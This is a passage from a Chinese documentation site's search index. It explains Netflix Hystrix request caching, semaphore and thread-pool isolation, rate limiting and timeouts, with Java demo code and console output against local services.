方法订阅它时，立即抛出调用者的 onError() 方法。 对于 toObservable()，返回一个 Observable 对象，但是调用 subscribe() 方法订阅它时，立即抛出调用者的 onError() 方法。  不同的执行方式     execute()，获取一个 Future.get()，然后拿到单个结果。 queue()，返回一个 Future。 observe()，立即订阅 Observable，然后启动 8 大执行步骤，返回一个拷贝的 Observable，订阅时立即回调给你结果。 toObservable()，返回一个原始的 Observable，必须手动订阅才会去执行 8 大步骤。  "},{"id":202,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-request-cache/","title":"hystrix-request-cache","parent":"高可用","content":"基于 request cache 请求缓存技术优化批量商品数据查询接口    Hystrix command 执行时 8 大步骤第三步，就是检查 Request cache 是否有缓存。\n首先，有一个概念，叫做 Request Context 请求上下文，一般来说，在一个 web 应用中，如果我们用到了 Hystrix，我们会在一个 filter 里面，对每一个请求都施加一个请求上下文。就是说，每一次请求，就是一次请求上下文。然后在这次请求上下文中，我们会去执行 N 多代码，调用 N 多依赖服务，有的依赖服务可能还会调用好几次。\n在一次请求上下文中，如果有多个 command，参数都是一样的，调用的接口也是一样的，而结果可以认为也是一样的。那么这个时候，我们可以让第一个 command 执行返回的结果缓存在内存中，然后这个请求上下文后续的其它对这个依赖的调用全部从内存中取出缓存结果就可以了。\n这样的话，好处在于不用在一次请求上下文中反复多次执行一样的 command，避免重复执行网络请求，提升整个请求的性能。\n举个栗子。比如说我们在一次请求上下文中，请求获取 productId 为 1 的数据，第一次缓存中没有，那么会从商品服务中获取数据，返回最新数据结果，同时将数据缓存在内存中。后续同一次请求上下文中，如果还有获取 productId 为 1 的数据的请求，直接从缓存中取就好了。\nHystrixCommand 和 HystrixObservableCommand 都可以指定一个缓存 key，然后 Hystrix 会自动进行缓存，接着在同一个 request context 内，再次访问的话，就会直接取用缓存。\n下面，我们结合一个具体的业务场景，来看一下如何使用 request cache 请求缓存技术。当然，以下代码只作为一个基本的 Demo 而已。\n现在，假设我们要做一个批量查询商品数据的接口，在这个里面，我们是用 HystrixCommand 一次性批量查询多个商品 id 的数据。但是这里有个问题，如果说 Nginx 在本地缓存失效了，重新获取一批缓存，传递过来的 productIds 都没有进行去重，比如 productIds=1,1,1,2,2，那么可能说，商品 id 出现了重复，如果按照我们之前的业务逻辑，可能就会重复对 productId=1 的商品查询三次，productId=2 的商品查询两次。\n我们对批量查询商品数据的接口，可以用 request cache 做一个优化，就是说一次请求，就是一次 request context，对相同的商品查询只执行一次，其余重复的都走 request cache。\n实现 Hystrix 请求上下文过滤器并注册    定义 HystrixRequestContextFilter 类，实现 Filter 接口。\n/** * Hystrix 请求上下文过滤器 */ public class HystrixRequestContextFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) { HystrixRequestContext context = HystrixRequestContext.initializeContext(); try { filterChain.doFilter(servletRequest, servletResponse); } catch (IOException | ServletException e) { e.printStackTrace(); } finally { context.shutdown(); } } @Override public void destroy() { } } 然后将该 filter 对象注册到 SpringBoot Application 中。\n@SpringBootApplication public class EshopApplication { public static void main(String[] args) { SpringApplication.run(EshopApplication.class, args); } @Bean public FilterRegistrationBean filterRegistrationBean() { FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean(new HystrixRequestContextFilter()); filterRegistrationBean.addUrlPatterns(\u0026#34;/*\u0026#34;); return filterRegistrationBean; } } command 重写 getCacheKey() 方法    在 GetProductInfoCommand 中，重写 getCacheKey() 方法，这样的话，每一次请求的结果，都会放在 Hystrix 请求上下文中。下一次同一个 productId 的数据请求，直接取缓存，无须再调用 run() 方法。\npublic class GetProductInfoCommand extends HystrixCommand\u0026lt;ProductInfo\u0026gt; { private Long productId; private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey(\u0026#34;GetProductInfoCommand\u0026#34;); public GetProductInfoCommand(Long productId) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ProductInfoService\u0026#34;)) .andCommandKey(KEY)); this.productId = productId; } @Override protected ProductInfo run() { String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; String response = HttpClientUtils.sendGetRequest(url); System.out.println(\u0026#34;调用接口查询商品数据，productId=\u0026#34; + productId); return JSONObject.parseObject(response, ProductInfo.class); } /** * 每次请求的结果，都会放在Hystrix绑定的请求上下文上 * * @return cacheKey 缓存key */ @Override public String getCacheKey() { return \u0026#34;product_info_\u0026#34; + productId; } /** * 将某个商品id的缓存清空 * * @param productId 商品id */ public static void flushCache(Long productId) { HystrixRequestCache.getInstance(KEY, HystrixConcurrencyStrategyDefault.getInstance()).clear(\u0026#34;product_info_\u0026#34; + productId); } } 这里写了一个 flushCache() 方法，用于我们开发手动删除缓存。\ncontroller 调用 command 查询商品信息    在一次 web 请求上下文中，传入商品 id 列表，查询多条商品数据信息。对于每个 productId，都创建一个 command。\n如果 id 列表没有去重，那么重复的 id，第二次查询的时候就会直接走缓存。\n@Controller public class CacheController { /** * 一次性批量查询多条商品数据的请求 * * @param productIds 以,分隔的商品id列表 * @return 响应状态 */ @RequestMapping(\u0026#34;/getProductInfos\u0026#34;) @ResponseBody public String getProductInfos(String productIds) { for (String productId : productIds.split(\u0026#34;,\u0026#34;)) { // 对每个productId，都创建一个command  GetProductInfoCommand getProductInfoCommand = new GetProductInfoCommand(Long.valueOf(productId)); ProductInfo productInfo = getProductInfoCommand.execute(); System.out.println(\u0026#34;是否是从缓存中取的结果：\u0026#34; + getProductInfoCommand.isResponseFromCache()); } return \u0026#34;success\u0026#34;; } } 发起请求    调用接口，查询多个商品的信息。\nhttp://localhost:8080/getProductInfos?productIds=1,1,1,2,2,5 在控制台，我们可以看到以下结果。\n调用接口查询商品数据，productId=1 是否是从缓存中取的结果：false 是否是从缓存中取的结果：true 是否是从缓存中取的结果：true 调用接口查询商品数据，productId=2 是否是从缓存中取的结果：false 是否是从缓存中取的结果：true 调用接口查询商品数据，productId=5 是否是从缓存中取的结果：false 第一次查询 productId=1 的数据，会调用接口进行查询，不是从缓存中取结果。而随后再出现查询 productId=1 的请求，就直接取缓存了，这样的话，效率明显高很多。\n删除缓存    我们写一个 UpdateProductInfoCommand，在更新商品信息之后，手动调用之前写的 flushCache()，手动将缓存删除。\npublic class UpdateProductInfoCommand extends HystrixCommand\u0026lt;Boolean\u0026gt; { private Long productId; public UpdateProductInfoCommand(Long productId) { super(HystrixCommandGroupKey.Factory.asKey(\u0026#34;UpdateProductInfoGroup\u0026#34;)); this.productId = productId; } @Override protected Boolean run() throws Exception { // 这里执行一次商品信息的更新  // ...  // 然后清空缓存  GetProductInfoCommand.flushCache(productId); return true; } } 这样，以后查询该商品的请求，第一次就会走接口调用去查询最新的商品信息。\n"},{"id":203,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-semphore-isolation/","title":"hystrix-semphore-isolation","parent":"高可用","content":"基于 Hystrix 信号量机制实现资源隔离    Hystrix 里面核心的一项功能，其实就是所谓的资源隔离，要解决的最最核心的问题，就是将多个依赖服务的调用分别隔离到各自的资源池内。避免说对某一个依赖服务的调用，因为依赖服务的接口调用的延迟或者失败，导致服务所有的线程资源全部耗费在这个服务的接口调用上。一旦说某个服务的线程资源全部耗尽的话，就可能导致服务崩溃，甚至说这种故障会不断蔓延。\nHystrix 实现资源隔离，主要有两种技术：\n 线程池 信号量  默认情况下，Hystrix 使用线程池模式。\n前面已经说过线程池技术了，这一小节就来说说信号量机制实现资源隔离，以及这两种技术的区别与具体应用场景。\n信号量机制    信号量的资源隔离只是起到一个开关的作用，比如，服务 A 的信号量大小为 10，那么就是说它同时只允许有 10 个 tomcat 线程来访问服务 A，其它的请求都会被拒绝，从而达到资源隔离和限流保护的作用。\n线程池与信号量区别    线程池隔离技术，并不是说去控制类似 tomcat 这种 web 容器的线程。更加严格的意义上来说，Hystrix 的线程池隔离技术，控制的是 tomcat 线程的执行。Hystrix 线程池满后，会确保说，tomcat 的线程不会因为依赖服务的接口调用延迟或故障而被 hang 住，tomcat 其它的线程不会卡死，可以快速返回，然后支撑其它的事情。\n线程池隔离技术，是用 Hystrix 自己的线程去执行调用；而信号量隔离技术，是直接让 tomcat 线程去调用依赖服务。信号量隔离，只是一道关卡，信号量有多少，就允许多少个 tomcat 线程通过它，然后去执行。\n适用场景：\n 线程池技术，适合绝大多数场景，比如说我们对依赖服务的网络请求的调用和访问、需要对调用的 timeout 进行控制（捕捉 timeout 超时异常）。 信号量技术，适合说你的访问不是对外部依赖的访问，而是对内部的一些比较复杂的业务逻辑的访问，并且系统内部的代码，其实不涉及任何的网络请求，那么只要做信号量的普通限流就可以了，因为不需要去捕获 timeout 类似的问题。  信号量简单 Demo    业务背景里，比较适合信号量的是什么场景呢？\n比如说，我们一般来说，缓存服务，可能会将一些量特别少、访问又特别频繁的数据，放在自己的纯内存中。\n举个栗子。一般我们在获取到商品数据之后，都要去获取商品是属于哪个地理位置、省、市、卖家等，可能在自己的纯内存中，比如就一个 Map 去获取。对于这种直接访问本地内存的逻辑，比较适合用信号量做一下简单的隔离。\n优点在于，不用自己管理线程池啦，不用 care timeout 超时啦，也不需要进行线程的上下文切换啦。信号量做隔离的话，性能相对来说会高一些。\n假如这是本地缓存，我们可以通过 cityId，拿到 cityName。\npublic class LocationCache { private static Map\u0026lt;Long, String\u0026gt; cityMap = new HashMap\u0026lt;\u0026gt;(); static { cityMap.put(1L, \u0026#34;北京\u0026#34;); } /** * 通过cityId 获取 cityName * * @param cityId 城市id * @return 城市名 */ public static String getCityName(Long cityId) { return cityMap.get(cityId); } } 写一个 GetCityNameCommand，策略设置为信号量。run() 方法中获取本地缓存。我们目的就是对获取本地缓存的代码进行资源隔离。\npublic class GetCityNameCommand extends HystrixCommand\u0026lt;String\u0026gt; { private Long cityId; public GetCityNameCommand(Long cityId) { // 设置信号量隔离策略  super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;GetCityNameGroup\u0026#34;)) .andCommandPropertiesDefaults(HystrixCommandProperties.Setter() .withExecutionIsolationStrategy(HystrixCommandProperties.ExecutionIsolationStrategy.SEMAPHORE))); this.cityId = cityId; } @Override protected String run() { // 需要进行信号量隔离的代码  return LocationCache.getCityName(cityId); } } 在接口层，通过创建 GetCityNameCommand，传入 cityId，执行 execute() 方法，那么获取本地 cityName 缓存的代码将会进行信号量的资源隔离。\n@RequestMapping(\u0026#34;/getProductInfo\u0026#34;) @ResponseBody public String getProductInfo(Long productId) { HystrixCommand\u0026lt;ProductInfo\u0026gt; getProductInfoCommand = new GetProductInfoCommand(productId); // 通过command执行，获取最新商品数据  ProductInfo productInfo = getProductInfoCommand.execute(); Long cityId = productInfo.getCityId(); GetCityNameCommand getCityNameCommand = new GetCityNameCommand(cityId); // 获取本地内存(cityName)的代码会被信号量进行资源隔离  String cityName = getCityNameCommand.execute(); productInfo.setCityName(cityName); System.out.println(productInfo); return \u0026#34;success\u0026#34;; } "},{"id":204,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-thread-pool-current-limiting/","title":"hystrix-thread-pool-current-limiting","parent":"高可用","content":"深入 Hystrix 线程池隔离与接口限流    前面讲了 Hystrix 的 request cache 请求缓存、fallback 优雅降级、circuit breaker 断路器快速熔断，这一讲，我们来详细说说 Hystrix 的线程池隔离与接口限流。\nHystrix 通过判断线程池或者信号量是否已满，超出容量的请求，直接 Reject 走降级，从而达到限流的作用。\n限流是限制对后端的服务的访问量，比如说你对 MySQL、Redis、Zookeeper 以及其它各种后端中间件的资源的访问的限制，其实是为了避免过大的流量直接打死后端的服务。\n线程池隔离技术的设计    Hystrix 采用了 Bulkhead Partition 舱壁隔离技术，来将外部依赖进行资源隔离，进而避免任何外部依赖的故障导致本服务崩溃。\n舱壁隔离，是说将船体内部空间区隔划分成若干个隔舱，一旦某几个隔舱发生破损进水，水流不会在其间相互流动，如此一来船舶在受损时，依然能具有足够的浮力和稳定性，进而减低立即沉船的危险。\nHystrix 对每个外部依赖用一个单独的线程池，这样的话，如果对那个外部依赖调用延迟很严重，最多就是耗尽那个依赖自己的线程池而已，不会影响其他的依赖调用。\nHystrix 应用线程池机制的场景     每个服务都会调用几十个后端依赖服务，那些后端依赖服务通常是由很多不同的团队开发的。 每个后端依赖服务都会提供它自己的 client 调用库，比如说用 thrift 的话，就会提供对应的 thrift 依赖。 client 调用库随时会变更。 client 调用库随时可能会增加新的网络请求的逻辑。 client 调用库可能会包含诸如自动重试、数据解析、内存中缓存等逻辑。 client 调用库一般都对调用者来说是个黑盒，包括实现细节、网络访问、默认配置等等。 在真实的生产环境中，经常会出现调用者，突然间惊讶的发现，client 调用库发生了某些变化。 即使 client 调用库没有改变，依赖服务本身可能有会发生逻辑上的变化。 有些依赖的 client 调用库可能还会拉取其他的依赖库，而且可能那些依赖库配置的不正确。 大多数网络请求都是同步调用的。 调用失败和延迟，也有可能会发生在 client 调用库本身的代码中，不一定就是发生在网络请求中。  简单来说，就是你必须默认 client 调用库很不靠谱，而且随时可能发生各种变化，所以就要用强制隔离的方式来确保任何服务的故障不会影响当前服务。\n线程池机制的优点     任何一个依赖服务都可以被隔离在自己的线程池内，即使自己的线程池资源填满了，也不会影响任何其他的服务调用。 服务可以随时引入一个新的依赖服务，因为即使这个新的依赖服务有问题，也不会影响其他任何服务的调用。 当一个故障的依赖服务重新变好的时候，可以通过清理掉线程池，瞬间恢复该服务的调用，而如果是 tomcat 线程池被占满，再恢复就很麻烦。 如果一个 client 调用库配置有问题，线程池的健康状况随时会报告，比如成功/失败/拒绝/超时的次数统计，然后可以近实时热修改依赖服务的调用配置，而不用停机。 基于线程池的异步本质，可以在同步的调用之上，构建一层异步调用层。  简单来说，最大的好处，就是资源隔离，确保说任何一个依赖服务故障，不会拖垮当前的这个服务。\n线程池机制的缺点      线程池机制最大的缺点就是增加了 CPU 的开销。\n除了 tomcat 本身的调用线程之外，还有 Hystrix 自己管理的线程池。\n  每个 command 的执行都依托一个独立的线程，会进行排队，调度，还有上下文切换。\n  Hystrix 官方自己做了一个多线程异步带来的额外开销统计，通过对比多线程异步调用+同步调用得出，Netflix API 每天通过 Hystrix 执行 10 亿次调用，每个服务实例有 40 个以上的线程池，每个线程池有 10 个左右的线程。）最后发现说，用 Hystrix 的额外开销，就是给请求带来了 3ms 左右的延时，最多延时在 10ms 以内，相比于可用性和稳定性的提升，这是可以接受的。\n  我们可以用 Hystrix semaphore 技术来实现对某个依赖服务的并发访问量的限制，而不是通过线程池/队列的大小来限制流量。\nsemaphore 技术可以用来限流和削峰，但是不能用来对调用延迟的服务进行 timeout 和隔离。\nexecution.isolation.strategy 设置为 SEMAPHORE，那么 Hystrix 就会用 semaphore 机制来替代线程池机制，来对依赖服务的访问进行限流。如果通过 semaphore 调用的时候，底层的网络调用延迟很严重，那么是无法 timeout 的，只能一直 block 住。一旦请求数量超过了 semaphore 限定的数量之后，就会立即开启限流。\n接口限流 Demo    假设一个线程池大小为 8，等待队列的大小为 10。timeout 时长我们设置长一些，20s。\n在 command 内部，写死代码，做一个 sleep，比如 sleep 3s。\n withCoreSize：设置线程池大小。 withMaxQueueSize：设置等待队列大小。 withQueueSizeRejectionThreshold：这个与 withMaxQueueSize 配合使用，等待队列的大小，取得是这两个参数的较小值。  如果只设置了线程池大小，另外两个 queue 相关参数没有设置的话，等待队列是处于关闭的状态。\npublic class GetProductInfoCommand extends HystrixCommand\u0026lt;ProductInfo\u0026gt; { private Long productId; private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey(\u0026#34;GetProductInfoCommand\u0026#34;); public GetProductInfoCommand(Long productId) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ProductInfoService\u0026#34;)) .andCommandKey(KEY) // 线程池相关配置信息  .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter() // 设置线程池大小为8  .withCoreSize(8) // 设置等待队列大小为10  .withMaxQueueSize(10) .withQueueSizeRejectionThreshold(12)) .andCommandPropertiesDefaults(HystrixCommandProperties.Setter() .withCircuitBreakerEnabled(true) .withCircuitBreakerRequestVolumeThreshold(20) .withCircuitBreakerErrorThresholdPercentage(40) .withCircuitBreakerSleepWindowInMilliseconds(3000) // 设置超时时间  .withExecutionTimeoutInMilliseconds(20000) // 设置fallback最大请求并发数  .withFallbackIsolationSemaphoreMaxConcurrentRequests(30))); this.productId = productId; } @Override protected ProductInfo run() throws Exception { System.out.println(\u0026#34;调用接口查询商品数据，productId=\u0026#34; + productId); if (productId == -1L) { throw new Exception(); } // 请求过来，会在这里hang住3秒钟  if (productId == -2L) { TimeUtils.sleep(3); } String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; String response = HttpClientUtils.sendGetRequest(url); System.out.println(response); return JSONObject.parseObject(response, ProductInfo.class); } @Override protected ProductInfo getFallback() { ProductInfo productInfo = new ProductInfo(); productInfo.setName(\u0026#34;降级商品\u0026#34;); return productInfo; } } 我们模拟 25 个请求。前 8 个请求，调用接口时会直接被 hang 住 3s，那么后面的 10 个请求会先进入等待队列中等待前面的请求执行完毕。最后的 7 个请求过来，会直接被 reject，调用 fallback 降级逻辑。\n@SpringBootTest @RunWith(SpringRunner.class) public class RejectTest { @Test public void testReject() { for (int i = 0; i \u0026lt; 25; ++i) { new Thread(() -\u0026gt; HttpClientUtils.sendGetRequest(\u0026#34;http://localhost:8080/getProductInfo?productId=-2\u0026#34;)).start(); } // 防止主线程提前结束执行  TimeUtils.sleep(50); } } 从执行结果中，我们可以明显看出一共打印出了 7 个降级商品。这也就是请求数超过线程池+队列的数量而直接被 reject 的结果。\nProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 调用接口查询商品数据，productId=-2 ProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) {\u0026#34;id\u0026#34;: -2, \u0026#34;name\u0026#34;: \u0026#34;iphone7手机\u0026#34;, \u0026#34;price\u0026#34;: 5599, \u0026#34;pictureList\u0026#34;:\u0026#34;a.jpg,b.jpg\u0026#34;, \u0026#34;specification\u0026#34;: \u0026#34;iphone7的规格\u0026#34;, \u0026#34;service\u0026#34;: \u0026#34;iphone7的售后服务\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;红色,白色,黑色\u0026#34;, \u0026#34;size\u0026#34;: \u0026#34;5.5\u0026#34;, \u0026#34;shopId\u0026#34;: 1, \u0026#34;modifiedTime\u0026#34;: \u0026#34;2017-01-01 12:00:00\u0026#34;, \u0026#34;cityId\u0026#34;: 1, \u0026#34;brandId\u0026#34;: 1} // 后面都是一些正常的商品信息，就不贴出来了 //... "},{"id":205,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-thread-pool-isolation/","title":"hystrix-thread-pool-isolation","parent":"高可用","content":"基于 Hystrix 线程池技术实现资源隔离    上一讲提到，如果从 Nginx 开始，缓存都失效了，Nginx 会直接通过缓存服务调用商品服务获取最新商品数据（我们基于电商项目做个讨论），有可能出现调用延时而把缓存服务资源耗尽的情况。这里，我们就来说说，怎么通过 Hystrix 线程池技术实现资源隔离。\n资源隔离，就是说，你如果要把对某一个依赖服务的所有调用请求，全部隔离在同一份资源池内，不会去用其它资源了，这就叫资源隔离。哪怕对这个依赖服务，比如说商品服务，现在同时发起的调用量已经到了 1000，但是分配给商品服务线程池内就 10 个线程，最多就只会用这 10 个线程去执行。不会因为对商品服务调用的延迟，将 Tomcat 内部所有的线程资源全部耗尽。\nHystrix 进行资源隔离，其实是提供了一个抽象，叫做 Command。这也是 Hystrix 最最基本的资源隔离技术。\n利用 HystrixCommand 获取单条数据    我们通过将调用商品服务的操作封装在 HystrixCommand 中，限定一个 key，比如下面的 GetProductInfoCommandGroup，在这里我们可以简单认为这是一个线程池，每次调用商品服务，就只会用该线程池中的资源，不会再去用其它线程资源了。\npublic class GetProductInfoCommand extends HystrixCommand\u0026lt;ProductInfo\u0026gt; { private Long productId; public GetProductInfoCommand(Long productId) { super(HystrixCommandGroupKey.Factory.asKey(\u0026#34;GetProductInfoCommandGroup\u0026#34;)); this.productId = productId; } @Override protected ProductInfo run() { String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; // 调用商品服务接口  String response = HttpClientUtils.sendGetRequest(url); return JSONObject.parseObject(response, ProductInfo.class); } } 我们在缓存服务接口中，根据 productId 创建 Command 并执行，获取到商品数据。\n@RequestMapping(\u0026#34;/getProductInfo\u0026#34;) @ResponseBody public String getProductInfo(Long productId) { HystrixCommand\u0026lt;ProductInfo\u0026gt; getProductInfoCommand = new GetProductInfoCommand(productId); // 通过command执行，获取最新商品数据  ProductInfo productInfo = getProductInfoCommand.execute(); System.out.println(productInfo); return \u0026#34;success\u0026#34;; } 上面执行的是 execute() 方法，其实是同步的。也可以对 command 调用 queue() 方法，它仅仅是将 command 放入线程池的一个等待队列，就立即返回，拿到一个 Future 对象，后面可以继续做其它一些事情，然后过一段时间对 Future 调用 get() 方法获取数据。这是异步的。\n利用 HystrixObservableCommand 批量获取数据    只要是获取商品数据，全部都绑定到同一个线程池里面去，我们通过 HystrixObservableCommand 的一个线程去执行，而在这个线程里面，批量把多个 productId 的 productInfo 拉回来。\npublic class GetProductInfosCommand extends HystrixObservableCommand\u0026lt;ProductInfo\u0026gt; { private String[] productIds; public GetProductInfosCommand(String[] productIds) { // 还是绑定在同一个线程池  super(HystrixCommandGroupKey.Factory.asKey(\u0026#34;GetProductInfoGroup\u0026#34;)); this.productIds = productIds; } @Override protected Observable\u0026lt;ProductInfo\u0026gt; construct() { return Observable.unsafeCreate((Observable.OnSubscribe\u0026lt;ProductInfo\u0026gt;) subscriber -\u0026gt; { for (String productId : productIds) { // 批量获取商品数据  String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; String response = HttpClientUtils.sendGetRequest(url); ProductInfo productInfo = JSONObject.parseObject(response, ProductInfo.class); subscriber.onNext(productInfo); } subscriber.onCompleted(); }).subscribeOn(Schedulers.io()); } } 在缓存服务接口中，根据传来的 id 列表，比如是以 , 分隔的 id 串，通过上面的 HystrixObservableCommand，执行 Hystrix 的一些 API 方法，获取到所有商品数据。\npublic String getProductInfos(String productIds) { String[] productIdArray = productIds.split(\u0026#34;,\u0026#34;); HystrixObservableCommand\u0026lt;ProductInfo\u0026gt; getProductInfosCommand = new GetProductInfosCommand(productIdArray); Observable\u0026lt;ProductInfo\u0026gt; observable = getProductInfosCommand.observe(); observable.subscribe(new Observer\u0026lt;ProductInfo\u0026gt;() { @Override public void onCompleted() { System.out.println(\u0026#34;获取完了所有的商品数据\u0026#34;); } @Override public void onError(Throwable e) { e.printStackTrace(); } /** * 获取完一条数据，就回调一次这个方法 * @param productInfo */ @Override public void onNext(ProductInfo productInfo) { System.out.println(productInfo); } }); return \u0026#34;success\u0026#34;; } 我们回过头来，看看 Hystrix 线程池技术是如何实现资源隔离的。\n从 Nginx 开始，缓存都失效了，那么 Nginx 通过缓存服务去调用商品服务。缓存服务默认的线程大小是 10 个，最多就只有 10 个线程去调用商品服务的接口。即使商品服务接口故障了，最多就只有 10 个线程会 hang 死在调用商品服务接口的路上，缓存服务的 Tomcat 内其它的线程还是可以用来调用其它的服务，干其它的事情。\n"},{"id":206,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/hystrix-timeout/","title":"hystrix-timeout","parent":"高可用","content":"基于 timeout 机制为服务接口调用超时提供安全保护    一般来说，在调用依赖服务的接口的时候，比较常见的一个问题就是超时。超时是在一个复杂的分布式系统中，导致系统不稳定，或者系统抖动。出现大量超时，线程资源会被 hang 死，从而导致吞吐量大幅度下降，甚至服务崩溃。\n你去调用各种各样的依赖服务，特别是在大公司，你甚至都不认识开发一个服务的人，你都不知道那个人的技术水平怎么样，对那个人根本不了解。\nPeter Steiner 说过，\u0026quot;On the Internet, nobody knows you\u0026rsquo;re a dog\u0026quot;，也就是说在互联网的另外一头，你都不知道甚至坐着一条狗。\n像特别复杂的分布式系统，特别是在大公司里，多个团队、大型协作，你可能都不知道服务是谁的，很可能说开发服务的那个哥儿们甚至是一个实习生。依赖服务的接口性能可能很不稳定，有时候 2ms，有时候 200ms，甚至 2s，都有可能。\n如果你不对各种依赖服务接口的调用做超时控制，来给你的服务提供安全保护措施，那么很可能你的服务就被各种垃圾的依赖服务的性能给拖死了。大量的接口调用很慢，大量的线程被卡死。如果你做了资源的隔离，那么也就是线程池的线程被卡死，但其实我们可以做超时控制，没必要让它们全卡死。\nTimeoutMilliseconds    在 Hystrix 中，我们可以手动设置 timeout 时长，如果一个 command 运行时间超过了设定的时长，那么就被认为是 timeout，然后 Hystrix command 标识为 timeout，同时执行 fallback 降级逻辑。\nTimeoutMilliseconds 默认值是 1000，也就是 1000ms。\nHystrixCommandProperties.Setter() ..withExecutionTimeoutInMilliseconds(int) TimeoutEnabled    这个参数用于控制是否要打开 timeout 机制，默认值是 true。\nHystrixCommandProperties.Setter() .withExecutionTimeoutEnabled(boolean) 实例 Demo    我们在 command 中，将超时时间设置为 500ms，然后在 run() 方法中，设置休眠时间 1s，这样一个请求过来，直接休眠 1s，结果就会因为超时而执行降级逻辑。\npublic class GetProductInfoCommand extends HystrixCommand\u0026lt;ProductInfo\u0026gt; { private Long productId; private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey(\u0026#34;GetProductInfoCommand\u0026#34;); public GetProductInfoCommand(Long productId) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(\u0026#34;ProductInfoService\u0026#34;)) .andCommandKey(KEY) .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter() .withCoreSize(8) .withMaxQueueSize(10) .withQueueSizeRejectionThreshold(8)) .andCommandPropertiesDefaults(HystrixCommandProperties.Setter() .withCircuitBreakerEnabled(true) .withCircuitBreakerRequestVolumeThreshold(20) .withCircuitBreakerErrorThresholdPercentage(40) .withCircuitBreakerSleepWindowInMilliseconds(3000) // 设置是否打开超时，默认是true  .withExecutionTimeoutEnabled(true) // 设置超时时间，默认1000(ms)  .withExecutionTimeoutInMilliseconds(500) .withFallbackIsolationSemaphoreMaxConcurrentRequests(30))); this.productId = productId; } @Override protected ProductInfo run() throws Exception { System.out.println(\u0026#34;调用接口查询商品数据，productId=\u0026#34; + productId); // 休眠1s  TimeUtils.sleep(1); String url = \u0026#34;http://localhost:8081/getProductInfo?productId=\u0026#34; + productId; String response = HttpClientUtils.sendGetRequest(url); System.out.println(response); return JSONObject.parseObject(response, ProductInfo.class); } @Override protected ProductInfo getFallback() { ProductInfo productInfo = new ProductInfo(); productInfo.setName(\u0026#34;降级商品\u0026#34;); return productInfo; } } 在测试类中，我们直接发起请求。\n@SpringBootTest @RunWith(SpringRunner.class) public class TimeoutTest { @Test public void testTimeout() { HttpClientUtils.sendGetRequest(\u0026#34;http://localhost:8080/getProductInfo?productId=1\u0026#34;); } } 结果中可以看到，打印出了降级商品相关信息。\nProductInfo(id=null, name=降级商品, price=null, pictureList=null, specification=null, service=null, color=null, size=null, shopId=null, modifiedTime=null, cityId=null, cityName=null, brandId=null, brandName=null) {\u0026#34;id\u0026#34;: 1, \u0026#34;name\u0026#34;: \u0026#34;iphone7手机\u0026#34;, \u0026#34;price\u0026#34;: 5599, \u0026#34;pictureList\u0026#34;:\u0026#34;a.jpg,b.jpg\u0026#34;, \u0026#34;specification\u0026#34;: \u0026#34;iphone7的规格\u0026#34;, \u0026#34;service\u0026#34;: \u0026#34;iphone7的售后服务\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;红色,白色,黑色\u0026#34;, \u0026#34;size\u0026#34;: \u0026#34;5.5\u0026#34;, \u0026#34;shopId\u0026#34;: 1, \u0026#34;modifiedTime\u0026#34;: \u0026#34;2017-01-01 12:00:00\u0026#34;, \u0026#34;cityId\u0026#34;: 1, \u0026#34;brandId\u0026#34;: 1} "},{"id":207,"href":"/database/mysql/InnoDB%E5%AF%B9MVCC%E7%9A%84%E5%AE%9E%E7%8E%B0/","title":"InnoDB对MVCC的实现","parent":"mysql","content":" 一致性非锁定读和锁定读  一致性非锁定读 锁定读   InnoDB 对 MVCC 的实现  隐藏字段 ReadView undo-log 数据可见性算法   RC、RR 隔离级别下 MVCC 的差异 MVCC 解决不可重复读问题  在 RC 下 ReadView 生成情况 在 RR 下 ReadView 生成情况   MVCC+Next-key-Lock 防止幻读  一致性非锁定读和锁定读    一致性非锁定读    对于 一致性非锁定读（Consistent 